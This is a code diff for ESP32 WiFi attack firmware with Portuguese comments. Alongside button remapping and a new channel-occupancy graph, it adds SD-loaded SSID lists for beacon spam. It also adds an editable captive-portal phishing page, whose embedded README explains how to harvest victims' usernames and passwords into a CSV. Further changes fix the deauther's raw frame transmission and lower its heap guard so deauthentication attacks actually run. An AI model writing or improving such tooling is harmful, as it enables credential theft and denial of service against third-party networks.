@@ -1,3 +1,4 @@
+#include <cmath>
 #include "KeyboardUI.h"
 #include "SettingsStore.h"
 #include "Touchscreen.h"
@@ -11,6 +12,10 @@
 #include "icon.h"
 #include "shared.h"
 #include "utils.h"
+
+// TEMP diagnostic for the Deauther STA/AP mode investigation (HANDOFF.md sec. 7).
+// Remove once the fix is confirmed on serial.
+#define DEAUTH_DEBUG_LOG 1
 
 extern "C" {
 #include "lwip/etharp.h"
@@ -746,7 +751,8 @@ static void ptmDrawWaitCard() {
 void ptmSetup() {
   pauseBackgroundRadioTasks();
   setTouchButtonInputEnabled(true);
-  setTouchNavLabels("Ch-", nullptr, "Exit", nullptr, "Ch+");
+  // Layout remapeado: LEFT=Exit, UP=Ch+, DOWN=Ch-, SELECT e RIGHT livres.
+  setTouchNavLabels("Exit", "Ch-", nullptr, "Ch+", nullptr);
   s_ptmHwReady = false;
 
 #if HAS_PCF8574_BUTTONS
@@ -818,7 +824,12 @@ void ptmLoop() {
     }
   }
 
-  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+  // Layout remapeado: fisico LEFT sai (em vez do SELECT do meio). O slot da
+  // barra de toque que mostra "Exit" agora e o da ESQUERDA (ver ptmSetup) --
+  // isButtonPressed(BTN_LEFT) ja cobre esse toque sozinho (fisico OU touch
+  // nav no mesmo slot); nao precisa somar isTouchNavButtonPressed(BTN_SELECT),
+  // que agora e um slot livre (sem label) e nao deveria sair a tela ao tocar.
+  if (feature_active && isButtonPressed(BTN_LEFT)) {
 
     esp_wifi_set_promiscuous(false);
     if (pcapPacketsWritten || pcapDropped) {
@@ -887,8 +898,11 @@ void ptmLoop() {
   static uint32_t lastButtonTime = 0;
   const uint32_t debounceDelay = 200;
 
-  bool leftButtonState = isButtonPressed(BTN_LEFT);
-  bool rightButtonState = isButtonPressed(BTN_RIGHT);
+  // Layout remapeado: fisico DOWN = Ch- (antes era o LEFT), fisico UP = Ch+
+  // (antes era o RIGHT). LEFT ficou livre pra sair (ver checagem de exit
+  // acima) e RIGHT ficou sem funcao nesta tela.
+  bool leftButtonState = isButtonPressed(BTN_DOWN);
+  bool rightButtonState = isButtonPressed(BTN_UP);
 
   uint32_t currentTime = millis();
 
@@ -938,6 +952,65 @@ static const char* ssidList[] = {
 
 static const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);
 
+// ── Custom SSID list from SD (/ssid_list.txt) ──────────────────────────────
+// Optional: one SSID per line (<=32 chars, blank lines ignored). When present
+// with >=1 valid name it replaces the built-in array; otherwise we fall back
+// to ssidList[] above. SD is mounted via the shared isSDCardAvailable() helper
+// so the SPI-bus hand-off (SD shares the bus with the NRF24 radio) is honored.
+#ifndef BEACON_SD_MAX_SSIDS
+#define BEACON_SD_MAX_SSIDS 64
+#endif
+static String s_sdSsids[BEACON_SD_MAX_SSIDS];
+static int    s_sdSsidCount = 0;
+static bool   s_usingSdList = false;
+
+static inline int activeSsidCount() {
+  return s_usingSdList ? s_sdSsidCount : ssidCount;
+}
+static inline const char* activeSsid(int i) {
+  return s_usingSdList ? s_sdSsids[i].c_str() : ssidList[i];
+}
+
+// Returns number of names loaded from SD (0 = keep built-in list).
+static int loadSsidListFromSd() {
+  s_usingSdList = false;
+  s_sdSsidCount = 0;
+
+  if (!isSDCardAvailable()) {
+    Serial.println("[Beacon] SD not available; using built-in SSID list");
+    return 0;
+  }
+  if (!SD.exists("/ssid_list.txt")) {
+    Serial.println("[Beacon] /ssid_list.txt not found; using built-in SSID list");
+    return 0;
+  }
+  File f = SD.open("/ssid_list.txt", FILE_READ);
+  if (!f) {
+    Serial.println("[Beacon] could not open /ssid_list.txt; using built-in list");
+    return 0;
+  }
+
+  int n = 0;
+  while (f.available() && n < BEACON_SD_MAX_SSIDS) {
+    String line = f.readStringUntil('\n');
+    line.replace("\r", "");
+    line.trim();
+    if (line.length() == 0) continue;
+    if (line.length() > 32) line = line.substring(0, 32);
+    s_sdSsids[n++] = line;
+  }
+  f.close();
+
+  if (n >= 1) {
+    s_sdSsidCount = n;
+    s_usingSdList = true;
+    Serial.printf("[Beacon] loaded %d SSID(s) from /ssid_list.txt\n", n);
+  } else {
+    Serial.println("[Beacon] /ssid_list.txt empty; using built-in SSID list");
+  }
+  return n;
+}
+
 uint8_t spamchannel = 1;
 bool    spam        = false;
 int     y_offset    = 20;
@@ -976,14 +1049,15 @@ static void spamDrawIdleHint() {
   tft.setTextSize(1);
   tft.setTextColor(UI_WARN, TFT_BLACK);
   tft.setCursor(2, 30 + y_offset);
-  tft.print("[!] Press [UP] to start");
+  tft.print("[!] Press [Select] to start");
 }
 
 static void spamUpdateNavLabels() {
   if (!featureHasTouchNavBar()) {
     return;
   }
-  setTouchNavLabels("Ch-", "Flood", "Exit", spam ? "Stop" : "Start", "Ch+");
+  // Layout remapeado: LEFT=Exit, UP=Ch+, DOWN=Ch-, SELECT=Start/Stop, RIGHT=Flood.
+  setTouchNavLabels("Exit", "Ch-", spam ? "Stop" : "Start", "Ch+", "Flood");
   redrawTouchButtonBar();
 }
 
@@ -1124,7 +1198,7 @@ void output() {
   printLine(110 + y_offset, UI_TEXT, "[*] Starting broadcast");
   delay(150);
 
-  const int maxLines = min(ssidCount, min(18, spamMaxListLines()));
+  const int maxLines = min(activeSsidCount(), min(18, spamMaxListLines()));
   for (int i = 0; i < maxLines; i++) {
     const int y = 130 + i * 10 + y_offset;
     if (!spamYFits(y, 10)) {
@@ -1133,7 +1207,7 @@ void output() {
     tft.setTextColor(WHITE, TFT_BLACK);
     tft.setCursor(2, y);
     tft.print("[+] ");
-    tft.print(ssidList[i]);
+    tft.print(activeSsid(i));
     delay(40);
   }
 
@@ -1145,9 +1219,10 @@ void spammer() {
     spamchannel = 1;
   }
 
-  const int idx = s_ssidIdx % ssidCount;
-  s_ssidIdx = (uint8_t)((s_ssidIdx + 1) % ssidCount);
-  const char* ssid = ssidList[idx];
+  const int count = activeSsidCount();
+  const int idx = s_ssidIdx % count;
+  s_ssidIdx = (uint8_t)((s_ssidIdx + 1) % count);
+  const char* ssid = activeSsid(idx);
 
   // Stable locally-administered MAC per SSID index so phones keep distinct APs.
   uint8_t mac[6] = {
@@ -1185,8 +1260,12 @@ void beaconSpam() {
     if (spamYFits(50 + y_offset, 10)) {
       tft.setTextColor(UI_TEXT, TFT_BLACK);
       tft.setCursor(2, 50 + y_offset);
-      tft.print("[!!] Press [Select] to exit");
+      tft.print("[!!] Press [Select] to stop");
     }
+    // Enquanto o flood roda, SELECT para ELE (nao o spam normal) -- o rodapé
+    // nao deve ficar mostrando "Start" (reflexo do estado do spam normal,
+    // que esta false aqui).
+    setTouchNavLabels("Exit", "Ch-", "Stop", "Ch+", "Flood");
     maintainTouchNavBar();
 
     delay(300);
@@ -1227,7 +1306,7 @@ void beaconSpam() {
         channel = (uint8_t)random(1, kMaxChannel + 1);
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-        const char* ssid = ssidList[floodIdx % ssidCount];
+        const char* ssid = activeSsid(floodIdx % activeSsidCount());
         floodIdx++;
 
         uint8_t mac[6] = {
@@ -1382,6 +1461,9 @@ void beaconSpamSetup() {
   setTouchButtonInputEnabled(true);
   spam = false;
   s_ssidIdx = 0;
+
+  // Load custom names from /ssid_list.txt on SD (falls back to built-in list).
+  loadSsidListFromSd();
   if (spamchannel < 1 || spamchannel > kMaxChannel) {
     spamchannel = 1;
   }
@@ -1437,7 +1519,13 @@ void beaconSpamSetup() {
 
 void beaconSpamLoop() {
 
-  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+  // Layout remapeado: fisico LEFT sai (em vez do SELECT do meio). O slot da
+  // barra de toque que mostra "Exit" agora e o da ESQUERDA (ver
+  // spamUpdateNavLabels) -- isButtonPressed(BTN_LEFT) ja cobre esse toque
+  // sozinho (fisico OU touch nav no mesmo slot), por isso NAO soma mais
+  // isTouchNavButtonPressed(BTN_SELECT) aqui (aquele slot agora mostra
+  // "Start/Stop" e tocar nele saia por engano).
+  if (feature_active && isButtonPressed(BTN_LEFT)) {
     feature_exit_requested = true;
     return;
   }
@@ -1446,20 +1534,29 @@ void beaconSpamLoop() {
   updateStatusBar();
   spamRedrawChrome();
 
-  btnLeftPress = isButtonPressed(BTN_LEFT);
-  btnRightPress = isButtonPressed(BTN_RIGHT);
-  btnSelectPress = isButtonPressed(BTN_UP);
-  btnDownPress = isButtonPressed(BTN_DOWN);
+  // Layout remapeado (nomes das variaveis mantidos, so a origem mudou):
+  //   btnLeftPress  (canal -) <- fisico DOWN
+  //   btnRightPress (canal +) <- fisico UP
+  //   btnSelectPress (start/stop) <- fisico SELECT (antes era o UP)
+  //   btnDownPress  (flood)  <- fisico RIGHT (antes era o DOWN)
+  btnLeftPress = isButtonPressed(BTN_DOWN);
+  btnRightPress = isButtonPressed(BTN_UP);
+  btnSelectPress = isButtonPressed(BTN_SELECT);
+  btnDownPress = isButtonPressed(BTN_RIGHT);
 
   delay(10);
 
+  // waitButtonReleased() (nao so delay(200)) consome a soltura real do botao
+  // antes de deixar o loop ler o mesmo toque de novo -- senao um aperto um
+  // pouco mais longo (>200ms, comum num toque humano normal) era lido como
+  // 2 acoes (ex.: "sobe 2 canais" num unico aperto).
   if (btnLeftPress) {
     handleLeftButton();
-    delay(200);
+    waitButtonReleased(BTN_DOWN);
   }
   if (btnRightPress) {
     handleRightButton();
-    delay(200);
+    waitButtonReleased(BTN_UP);
   }
   if (btnDownPress) {
     // Random flood mode (same as toolbar nuke).
@@ -1472,6 +1569,7 @@ void beaconSpamLoop() {
     while (isButtonPressed(BTN_SELECT)) {
       delay(10);
     }
+    waitButtonReleased(BTN_RIGHT);
     delay(150);
     spamClearBody();
     spamDrawIdleHint();
@@ -1481,7 +1579,7 @@ void beaconSpamLoop() {
   if (btnSelectPress) {
     const bool wasRunning = spam;
     handleSelectButton();
-    delay(200);
+    waitButtonReleased(BTN_SELECT);
     if (!wasRunning && spam) {
       spamClearBody();
       output();
@@ -1503,8 +1601,11 @@ void beaconSpamLoop() {
   }
 
   // Keep transmitting while enabled — do not require holding UP.
+  // (Layout remapeado: mesmo criterio de saida do topo da funcao — so o LEFT
+  // fisico, que ja cobre o toque no slot "Exit" via isButtonPressed. NAO mais
+  // o SELECT fisico, que agora e o start/stop.)
   if (spam) {
-    if (feature_exit_requested || featureExitButtonPressed()) {
+    if (feature_exit_requested || isButtonPressed(BTN_LEFT)) {
       spam = false;
       return;
     }
@@ -3009,6 +3110,123 @@ static bool cpAppendCaptureToSD(const String& remoteIp, const String& username, 
   return cpAppendLineToFile(path, row);
 }
 
+// --- SD-editable captive portal page -----------------------------------------
+// Mirrors the Beacon "/ssid_list.txt" pattern: the login page is seeded to the
+// SD card on first run (so there is a file to edit) and reloaded from there on
+// every run, falling back to the built-in page if the SD/file is unavailable.
+static const char* kCpPagePath   = "/captive_portal/login.html";
+static const char* kCpReadmePath = "/captive_portal/README.txt";
+
+static const char kCpReadmeText[] = R"RDME(ESP32-DIV - Captive Portal: pagina editavel
+===========================================================
+
+ARQUIVO DA PAGINA
+-----------------
+  /captive_portal/login.html
+
+Edite esse arquivo (qualquer editor de texto) para mudar a APARENCIA da
+pagina mostrada ao alvo. Ele foi criado automaticamente na primeira vez, com
+a pagina padrao, so para voce ter um ponto de partida.
+
+- Mexa a vontade no HTML/CSS: cores, textos, layout, logo (imagem em base64
+  embutida funciona, sem depender de internet).
+- Se o arquivo faltar, estiver vazio ou o SD nao montar, o firmware usa a
+  pagina embutida (fallback). Nada quebra.
+- Salve e recoloque o cartao. Nao precisa recompilar nada.
+
+CONTRATO OBRIGATORIO (para os dados digitados serem registrados)
+----------------------------------------------------------------
+O firmware so captura o que for enviado EXATAMENTE assim:
+
+  1. Formulario que faz POST para /login :
+        <form action='/login' method='POST'> ... </form>
+  2. Campo de senha com name="password" :
+        <input type='password' name='password'>
+  3. (Opcional) campo de usuario com name="username" :
+        <input type='text' name='username'>
+  4. Um submit dentro do form:
+        <button type='submit'>Entrar</button>
+
+Se voce renomear os campos (ex.: name='senha') ou mudar o action, o dado
+NAO sera registrado. Os nomes username/password e o action /login sao fixos
+no firmware.
+
+ONDE OS DADOS FICAM
+-------------------
+Cada envio e gravado em:
+  /captive_portal/captured.csv
+Colunas: millis,remote_ip,ssid,username,password
+(Tambem salvos na EEPROM, exportaveis pela tela do aparelho.)
+
+EXEMPLO MINIMO QUE FUNCIONA
+---------------------------
+  <!DOCTYPE html><html><head><meta name='viewport'
+    content='width=device-width, initial-scale=1'></head><body>
+    <h1>Minha pagina</h1>
+    <form action='/login' method='POST'>
+      <input type='text' name='username' placeholder='Usuario'><br>
+      <input type='password' name='password' placeholder='Senha' required><br>
+      <button type='submit'>Entrar</button>
+    </form>
+  </body></html>
+
+USO AUTORIZADO
+--------------
+Apenas em laboratorio/equipamentos proprios ou com autorizacao explicita,
+para estudo e defesa. Nao use contra terceiros.
+)RDME";
+
+static bool cpWriteFileIfMissing(const char* path, const String& content) {
+  if (!cpMountSD()) return false;
+  if (SD.exists(path)) return true;          // never overwrite the user's edits
+  File f = SD.open(path, "w");
+  if (!f) {
+    cp_sd_mounted = false;
+    if (!cpMountSD()) return false;
+    f = SD.open(path, "w");
+    if (!f) return false;
+  }
+  f.print(content);
+  f.flush();
+  f.close();
+  return true;
+}
+
+// Seed login.html (with the current built-in page) and README.txt on first run.
+static void cpSeedPortalFilesOnSD() {
+  if (!cpEnsureDir("/captive_portal")) {
+    Serial.println("[SD] /captive_portal unavailable; built-in portal page");
+    return;
+  }
+  if (cpWriteFileIfMissing(kCpPagePath, loginPage)) {
+    Serial.printf("[SD] editable portal page at %s\n", kCpPagePath);
+  }
+  cpWriteFileIfMissing(kCpReadmePath, String(kCpReadmeText));
+}
+
+// Load the (possibly user-edited) page from SD into loginPage; fall back to the
+// built-in default on any problem.
+static void cpLoadLoginPageFromSD() {
+  if (!cpMountSD())            { Serial.println("[SD] not mounted; built-in portal page"); return; }
+  if (!SD.exists(kCpPagePath)) { Serial.println("[SD] login.html missing; built-in portal page"); return; }
+  File f = SD.open(kCpPagePath, FILE_READ);
+  if (!f)                      { Serial.println("[SD] cannot open login.html; built-in portal page"); return; }
+
+  String html;
+  html.reserve(f.size() + 1);
+  while (f.available()) html += (char)f.read();
+  f.close();
+
+  if (html.length() < 20) {    // too small to be a real page -> keep default
+    Serial.println("[SD] login.html empty/too small; built-in portal page");
+    return;
+  }
+  loginPage = html;
+  Serial.printf("[SD] loaded portal page from %s (%u bytes)\n",
+                kCpPagePath, (unsigned)loginPage.length());
+  displayPrint("Portal page loaded from SD", GREEN, false);
+}
+
 static bool cpDumpAllCredentialsToSD(int* outCount) {
   if (outCount) *outCount = 0;
   const char* dir  = "/captive_portal";
@@ -4163,6 +4381,10 @@ void cportalSetup() {
   }
   loadSSID();
 
+  // Seed (first run) + load the SD-editable login page; falls back to built-in.
+  cpSeedPortalFilesOnSD();
+  cpLoadLoginPageFromSD();
+
   startAttack();
 
   drawMainMenu();
@@ -4252,10 +4474,13 @@ static void deautherUpdateNavLabels(bool onAttackScreen) {
   if (!featureHasTouchNavBar()) {
     return;
   }
+  // Layout remapeado:
+  //  lista de scan: LEFT=Exit, DOWN=Next, SELECT=View, UP=Prev, RIGHT=Rescan.
+  //  tela de ataque (View): LEFT=Back (pra lista), SELECT=Start/Stop, resto livre.
   if (onAttackScreen) {
-    setTouchNavLabels(attack_running ? "Stop" : "Start", nullptr, "Exit", nullptr, "Back");
+    setTouchNavLabels("Back", nullptr, attack_running ? "Stop" : "Start", nullptr, nullptr);
   } else {
-    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "View");
+    setTouchNavLabels("Exit", "Next", "View", "Prev", "Rescan");
   }
   redrawTouchButtonBar();
 }
@@ -4306,6 +4531,18 @@ void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
         consecutive_failures++;
 
     }
+
+#if DEAUTH_DEBUG_LOG
+    static uint32_t s_lastLog = 0;
+    const uint32_t now = millis();
+    if (now - s_lastLog >= 1000) {
+        wifi_mode_t mode;
+        esp_err_t gm = esp_wifi_get_mode(&mode);
+        Serial.printf("[deauth] tx res=%d mode=%d (gm=%d) pkt=%u ok=%u fail=%u\n",
+                      res, (int)mode, gm, packet_count, success_count, consecutive_failures);
+        s_lastLog = now;
+    }
+#endif
 }
 
 void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
@@ -4441,19 +4678,29 @@ bool scanNetworks() {
     return true;
 }
 
+// Bare WiFi.mode(WIFI_AP) leaves the AP interface configured but without an
+// active BSS, which is not reliable for esp_wifi_80211_tx(WIFI_IF_AP, ...).
+// Bring it up the same way beaconSpamSetup() does (the one raw-TX feature
+// confirmed to reach the air): real softAP + promiscuous mode.
+static void deautherEnsureApOnChannel(uint8_t channel) {
+    esp_wifi_set_mode(WIFI_MODE_AP);
+    esp_wifi_start();
+    WiFi.softAP(".", nullptr, channel, 1, 4);
+    esp_wifi_set_promiscuous(true);
+    delay(100);
+}
+
 bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
     const int n = WifiScan::staWifiScanSync();
     for (int i = 0; i < n; i++) {
         if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
             *channel = WiFi.channel(i);
-            WiFi.mode(WIFI_AP);
-            delay(100);
+            deautherEnsureApOnChannel(*channel);
             return true;
         }
     }
 
-    WiFi.mode(WIFI_AP);
-    delay(100);
+    deautherEnsureApOnChannel(selectedChannel);
     return false;
 }
 
@@ -4527,24 +4774,30 @@ static void deautherHandleNavButtons() {
         (void)isButtonPressedEdge(BTN_RIGHT);
         (void)isButtonPressedEdge(BTN_UP);
         (void)isButtonPressedEdge(BTN_DOWN);
+        (void)isButtonPressedEdge(BTN_SELECT);
         return;
     }
 
+    // Layout remapeado: tela de ataque (View) -- LEFT volta pra lista de scan
+    // (antes era o RIGHT); SELECT inicia/para o ataque (antes era o LEFT).
+    // UP/DOWN/RIGHT ficaram sem funcao aqui.
     if (selected_ap_index >= 0) {
         if (isButtonPressedEdge(BTN_LEFT)) {
-            attack_running = !attack_running;
-            if (!attack_running) {
-                last_packet_time = 0;
-            }
-            drawAttackScreen();
-            deautherLastButtonPress = now;
-            return;
-        }
-        if (isButtonPressedEdge(BTN_RIGHT)) {
             attack_running = false;
             last_packet_time = 0;
             selected_ap_index = -1;
             drawScanScreen();
+            deautherLastButtonPress = now;
+            return;
+        }
+        if (isButtonPressedEdge(BTN_SELECT)) {
+            attack_running = !attack_running;
+            if (attack_running) {
+                deautherEnsureApOnChannel(selectedChannel);
+            } else {
+                last_packet_time = 0;
+            }
+            drawAttackScreen();
             deautherLastButtonPress = now;
             return;
         }
@@ -4555,10 +4808,12 @@ static void deautherHandleNavButtons() {
         return;
     }
 
+    // Layout remapeado: lista de scan -- LEFT sai do Deauther (antes era o
+    // SELECT, agora global); RIGHT rescaneia (antes era o LEFT); SELECT abre
+    // o alvo selecionado / View (antes era o RIGHT). UP/DOWN continuam
+    // Prev/Next, sem mudanca.
     if (isButtonPressedEdge(BTN_LEFT)) {
-        if (scanNetworks()) {
-            drawScanScreen();
-        }
+        feature_exit_requested = true;
         deautherLastButtonPress = now;
         return;
     }
@@ -4574,7 +4829,14 @@ static void deautherHandleNavButtons() {
         deautherLastButtonPress = now;
         return;
     }
-    if (isButtonPressedEdge(BTN_RIGHT) && network_count > 0) {
+    if (isButtonPressedEdge(BTN_RIGHT)) {
+        if (scanNetworks()) {
+            drawScanScreen();
+        }
+        deautherLastButtonPress = now;
+        return;
+    }
+    if (isButtonPressedEdge(BTN_SELECT) && network_count > 0) {
         deautherOpenTarget(currentIndex);
         deautherLastButtonPress = now;
     }
@@ -4627,7 +4889,9 @@ void handleTouch() {
             if (x >= 0 && x <= 57) {
                 drawButton(0, 304, 57, 16, attack_running ? "Stop" : "Start", true, false);
                 attack_running = !attack_running;
-                if (!attack_running) {
+                if (attack_running) {
+                    deautherEnsureApOnChannel(selectedChannel);
+                } else {
                     last_packet_time = 0;
                 }
                 drawAttackScreen();
@@ -4787,10 +5051,10 @@ void deautherSetup() {
 
 void deautherLoop() {
 
-    if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
-        feature_exit_requested = true;
-        return;
-    }
+    // Layout remapeado: a saida agora e tratada dentro de
+    // deautherHandleNavButtons() -- LEFT na lista de scan sai do Deauther;
+    // LEFT na tela de ataque (View) so volta pra lista (nao sai do feature).
+    // SELECT deixou de ser exit global (agora e "View"/start-stop).
 
     tft.drawFastHLine(0, 19, 240, UI_LINE);
 
@@ -4804,7 +5068,11 @@ void deautherLoop() {
     uint32_t current_time = millis();
     if (attack_running && selected_ap_index != -1) {
         uint32_t heap = ESP.getFreeHeap();
-        if (heap < 80000) {
+        // Baseline free heap on this build (BLE + background scanners + UI) is
+        // ~77 KB, so the original 80 KB guard aborted the attack before any TX.
+        // Raw 26-byte deauth frames need almost no heap; 30 KB keeps a real
+        // OOM safety margin while allowing the feature to run.
+        if (heap < 30000) {
             attack_running = false;
             last_packet_time = 0;
             drawAttackScreen();
@@ -4897,10 +5165,13 @@ static void probeUpdateNavLabels(bool onAttackScreen) {
   if (!featureHasTouchNavBar()) {
     return;
   }
+  // Layout remapeado:
+  //  lista de scan: LEFT=Exit, DOWN=Next, SELECT=View, UP=Prev, RIGHT=Rescan.
+  //  tela de ataque (View): LEFT=Back (pra lista), SELECT=Start/Stop, resto livre.
   if (onAttackScreen) {
-    setTouchNavLabels(attack_running ? "Stop" : "Start", nullptr, "Exit", nullptr, "Back");
+    setTouchNavLabels("Back", nullptr, attack_running ? "Stop" : "Start", nullptr, nullptr);
   } else {
-    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "View");
+    setTouchNavLabels("Exit", "Next", "View", "Prev", "Rescan");
   }
   redrawTouchButtonBar();
 }
@@ -5217,24 +5488,28 @@ static void probeHandleNavButtons() {
         (void)isButtonPressedEdge(BTN_RIGHT);
         (void)isButtonPressedEdge(BTN_UP);
         (void)isButtonPressedEdge(BTN_DOWN);
+        (void)isButtonPressedEdge(BTN_SELECT);
         return;
     }
 
+    // Layout remapeado: tela de ataque (View) -- LEFT volta pra lista de scan
+    // (antes era o RIGHT); SELECT inicia/para o ataque (antes era o LEFT).
+    // UP/DOWN/RIGHT ficaram sem funcao aqui.
     if (selected_ap_index >= 0) {
         if (isButtonPressedEdge(BTN_LEFT)) {
+            attack_running = false;
+            last_packet_time = 0;
+            selected_ap_index = -1;
+            drawScanScreen();
+            probeLastButtonPress = now;
+            return;
+        }
+        if (isButtonPressedEdge(BTN_SELECT)) {
             attack_running = !attack_running;
             if (!attack_running) {
                 last_packet_time = 0;
             }
             drawAttackScreen();
-            probeLastButtonPress = now;
-            return;
-        }
-        if (isButtonPressedEdge(BTN_RIGHT)) {
-            attack_running = false;
-            last_packet_time = 0;
-            selected_ap_index = -1;
-            drawScanScreen();
             probeLastButtonPress = now;
             return;
         }
@@ -5245,10 +5520,12 @@ static void probeHandleNavButtons() {
         return;
     }
 
+    // Layout remapeado: lista de scan -- LEFT sai do Probe Request Flood
+    // (antes era o SELECT, agora global); RIGHT rescaneia (antes era o
+    // LEFT); SELECT abre o alvo selecionado / View (antes era o RIGHT).
+    // UP/DOWN continuam Prev/Next, sem mudanca.
     if (isButtonPressedEdge(BTN_LEFT)) {
-        if (scanNetworks()) {
-            drawScanScreen();
-        }
+        feature_exit_requested = true;
         probeLastButtonPress = now;
         return;
     }
@@ -5264,7 +5541,14 @@ static void probeHandleNavButtons() {
         probeLastButtonPress = now;
         return;
     }
-    if (isButtonPressedEdge(BTN_RIGHT) && network_count > 0) {
+    if (isButtonPressedEdge(BTN_RIGHT)) {
+        if (scanNetworks()) {
+            drawScanScreen();
+        }
+        probeLastButtonPress = now;
+        return;
+    }
+    if (isButtonPressedEdge(BTN_SELECT) && network_count > 0) {
         probeOpenTarget(currentIndex);
         probeLastButtonPress = now;
     }
@@ -5475,10 +5759,10 @@ void probeRequestFloodSetup() {
 
 void probeRequestFloodLoop() {
 
-    if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
-        feature_exit_requested = true;
-        return;
-    }
+    // Layout remapeado: a saida agora e tratada dentro de
+    // probeHandleNavButtons() -- LEFT na lista de scan sai do Probe Request
+    // Flood; LEFT na tela de ataque (View) so volta pra lista (nao sai do
+    // feature). SELECT deixou de ser exit global (agora e "View"/start-stop).
 
     tft.drawFastHLine(0, 19, 240, UI_LINE);
 
@@ -9238,6 +9522,611 @@ void karmaLoop() {
 }
 
 }  // namespace KarmaAttack
+
+
+namespace ChannelGraph {
+
+// Live 2.4GHz channel-occupancy graph (WiFi Analyzer style), built entirely
+// from data the scan already returns: SSID, RSSI, channel, BSSID, auth mode.
+// The ESP32-S3 radio is 2.4GHz only, so this covers channels 1-13 and never
+// shows a 5GHz tab.
+
+#define SCREEN_WIDTH 240
+#define STATUS_BAR_Y_OFFSET 20
+#define STATUS_BAR_HEIGHT 16
+
+static constexpr int MAX_NETS = ESP32DIV_MAX_WIFI_NETWORKS;
+
+// Graph geometry. kWifiBodyTop (file-scope, see top of this file) is where
+// every WiFi feature's body starts, right below the shared status bar.
+static constexpr int GRAPH_X_LEFT  = 30;
+static constexpr int GRAPH_X_RIGHT = 234;
+static constexpr int DETAIL_STRIP_H = 16;
+// Row for the "1 2 3 ... 13" channel numbers under the plot, kept separate
+// from the detail strip below it so the two never overdraw each other.
+static constexpr int CHANNEL_LABEL_H = 10;
+static constexpr int AXIS_GAP = 2;
+static constexpr int RSSI_TOP_DBM = -30;
+static constexpr int RSSI_BOT_DBM = -90;
+
+struct CgNet {
+  char ssid[20];
+  uint8_t bssid[6];
+  int8_t rssi;
+  uint8_t channel;
+  wifi_auth_mode_t authmode;
+  uint8_t colorIdx;
+};
+
+static CgNet s_nets[MAX_NETS];
+static int s_count = 0;
+
+static bool s_hasSelection = false;
+static uint8_t s_selectedBssid[6] = {0};
+
+static bool s_scanning = false;
+static bool s_asyncScanActive = false;
+static bool s_needRedraw = true;
+static bool s_uiDrawn = false;
+static int s_scanAnimFrame = 0;
+static unsigned long s_lastScanAnimMs = 0;
+static unsigned long s_lastAutoScanMs = 0;
+static const unsigned long AUTO_RESCAN_MS = 15000;
+
+// Fixed, visually distinct palette. A network's color is picked from a hash
+// of its BSSID, so the same AP keeps the same color across rescans instead
+// of jumping around as scan order changes.
+static const uint16_t kPalette[] = {
+  0x07FF,  // cyan
+  0xFFE0,  // yellow
+  0xF81F,  // magenta
+  0xFD20,  // orange
+  0x87FF,  // light blue
+  0x07E0,  // green
+  0xF800,  // red
+  0xFBB6,  // light pink
+};
+static constexpr int kPaletteSize = sizeof(kPalette) / sizeof(kPalette[0]);
+
+static uint8_t colorIndexForBssid(const uint8_t bssid[6]) {
+  uint16_t h = 0;
+  for (int i = 0; i < 6; i++) {
+    h = (uint16_t)((h * 131) ^ bssid[i]);
+  }
+  return (uint8_t)(h % kPaletteSize);
+}
+
+// A few extra pixels of breathing room below the header row.
+static int graphTop() { return kWifiBodyTop + 6; }
+static int graphBottomFull() { return wifiListBottomY(); }
+static int detailStripY() { return graphBottomFull() - DETAIL_STRIP_H; }
+static int channelLabelY() { return detailStripY() - CHANNEL_LABEL_H; }
+static int graphBottom() { return channelLabelY() - AXIS_GAP; }
+
+static float xForCh(float ch) {
+  return GRAPH_X_LEFT + (ch - 1.0f) * (float)(GRAPH_X_RIGHT - GRAPH_X_LEFT) / 12.0f;
+}
+
+static float chAtX(int x) {
+  return 1.0f + (float)(x - GRAPH_X_LEFT) * 12.0f / (float)(GRAPH_X_RIGHT - GRAPH_X_LEFT);
+}
+
+static int yForRssi(int rssi) {
+  const int r = constrain(rssi, RSSI_BOT_DBM, RSSI_TOP_DBM);
+  // Qualified as ::map — unqualified `map` is ambiguous here because <map>
+  // (pulled in transitively via NimBLE headers) also brings std::map into scope.
+  return ::map(r, RSSI_BOT_DBM, RSSI_TOP_DBM, graphBottom(), graphTop());
+}
+
+static const char* authShort(wifi_auth_mode_t mode) {
+  switch (mode) {
+    case WIFI_AUTH_OPEN: return "OPEN";
+    case WIFI_AUTH_WEP: return "WEP";
+    case WIFI_AUTH_WPA_PSK: return "WPA";
+    case WIFI_AUTH_WPA2_PSK: return "WPA2";
+    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA*";
+    case WIFI_AUTH_WPA2_ENTERPRISE: return "ENT";
+    case WIFI_AUTH_WPA3_PSK: return "WPA3";
+    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA3*";
+    default: return "?";
+  }
+}
+
+// Among {1, 6, 11}: lower score = less overlap from neighboring networks.
+// Linear weight decaying to 0 over 5 channels of distance, times each
+// network's linear (not dBm) power so strong-but-distant APs still count.
+static int suggestedChannel() {
+  static const int kCandidates[3] = {1, 6, 11};
+  int best = kCandidates[0];
+  double bestScore = 1e18;
+  for (int ci = 0; ci < 3; ci++) {
+    const int c = kCandidates[ci];
+    double score = 0.0;
+    for (int i = 0; i < s_count; i++) {
+      const double dist = fabs((double)c - (double)s_nets[i].channel);
+      const double w = 1.0 - dist / 5.0;
+      if (w <= 0.0) continue;
+      score += w * pow(10.0, (double)s_nets[i].rssi / 10.0);
+    }
+    if (score < bestScore) {
+      bestScore = score;
+      best = c;
+    }
+  }
+  return best;
+}
+
+static int findSelectedIndex() {
+  if (!s_hasSelection) return -1;
+  for (int i = 0; i < s_count; i++) {
+    if (memcmp(s_nets[i].bssid, s_selectedBssid, 6) == 0) return i;
+  }
+  return -1;
+}
+
+static int findConnectedIndex() {
+  if (WiFi.status() != WL_CONNECTED) return -1;
+  const uint8_t* bssid = WiFi.BSSID();
